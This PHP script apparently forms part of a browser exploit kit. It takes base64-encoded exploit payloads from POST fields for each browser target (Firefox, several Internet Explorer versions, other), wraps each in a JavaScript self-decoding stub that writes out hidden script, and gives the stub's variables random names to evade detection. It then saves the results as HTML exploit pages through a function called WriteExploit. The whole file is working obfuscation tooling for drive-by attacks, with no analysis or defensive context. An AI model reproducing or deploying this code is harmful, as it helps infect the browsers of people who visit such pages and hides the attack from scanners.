<?php

function rndvar( )
			{
				$len = mt_rand( 5, 7 );
    				$chss = "abcdefghijkxy";
    				$chsg = "lmnopqrstuvwz";
				$v = "";
				$i = 0;
				for ( ; $i < $len; $i++ )
					{
						$v .= $i % 2 == 0 ? $chss[mt_rand( 0, strlen( $chss ) - 1 )] : $chsg[mt_rand( 0, strlen( $chsg ) - 1 )];
					}
				if ( mt_rand( 0, 3 ) == 0 )
					{
						$v .= mt_rand( 1, 9 );
    					}
    				return $v;
			}
function ObfuscateVars($input)
	{
		$rn=array();
		$tochange=array("RandomVar12" , "RandomVar11" , "RandomVar10", "RandomVar9", "RandomVar8", "RandomVar7", "RandomVar6", "RandomVar5", "RandomVar4", "RandomVar3", "RandomVar2", "RandomVar1");
				for ($i=1; $i <= 12; $i++ )
				{
					while ($noinarray!=1)
						{
							$current=rndvar( );
							if (!in_array($current, $rn)) 
								{
									$noinarray=1;
									$rn[$i]=$current;
								}
						}
					$noinarray=0;
				}

		return str_replace($tochange, $rn, $input);
	}
function WriteExploit($path,$data)
	{
		$file = $path;
		$fh = fopen($file, "w") or die("File ($file) does not exist!");
		fwrite($fh, $data);
		fclose($fh);
	}
$ff=base64_decode($_POST['ffc']);
$ie=base64_decode($_POST['iec']);
$ie8=base64_decode($_POST['ie8c']);
$other=base64_decode($_POST['otherc']);
$vistaie7=base64_decode($_POST['vistaie7c']);
$xpie7=base64_decode($_POST['xpie7c']);
$stub="function RandomVar11(RandomVar12){document.write('<scr'+'ipt>'+RandomVar12+'</scr'+'ipt>');}RandomVar4=new Array();while(RandomVar1.length){RandomVar4.push((RandomVar8(RandomVar1.charCodeAt(0))<<6)+RandomVar8(RandomVar1.charCodeAt(1))-512);RandomVar1=RandomVar1.slice(2,RandomVar1.length)}RandomVar5=RandomVar6=RandomVar1=0;RandomVar7='';function RandomVar8(RandomVar9){if(RandomVar9>92)RandomVar9--;return RandomVar9-42}function RandomVar10(){if(RandomVar1==0){RandomVar6=RandomVar8(RandomVar2.charCodeAt(RandomVar5++));RandomVar1=6;}return ((RandomVar6>>--RandomVar1)&0x01);}while(RandomVar3--){i=0;while(RandomVar4[i]<0){if(RandomVar10())i=-RandomVar4[i];else i++;}RandomVar7+=String.fromCharCode(RandomVar4[i]);}RandomVar11(RandomVar7);";
$ff="<script>".$ff.$stub."</script>";
$ie="<script>".$ie.$stub."</script>";
$ie8="<script>".$ie8.$stub."</script>";
$other="<script>".$other.$stub."</script>";
$vistaie7="<script>".$vistaie7.$stub."</script>";
$xpie7="<script>".$xpie7.$stub."</script>";
$ff=ObfuscateVars($ff);
$ie=ObfuscateVars($ie);
$ie8=ObfuscateVars($ie8);
$other=ObfuscateVars($other);
$vistaie7=ObfuscateVars($vistaie7);
$xpie7=ObfuscateVars($xpie7);
WriteExploit("tmp/ff.html",$ff);
WriteExploit("tmp/ie.html",$ie);
WriteExploit("tmp/ie8.html",$ie8);
WriteExploit("tmp/other.html",$other);
WriteExploit("tmp/vistaie7.html",$vistaie7);
WriteExploit("tmp/xpie7.html",$xpie7);
?>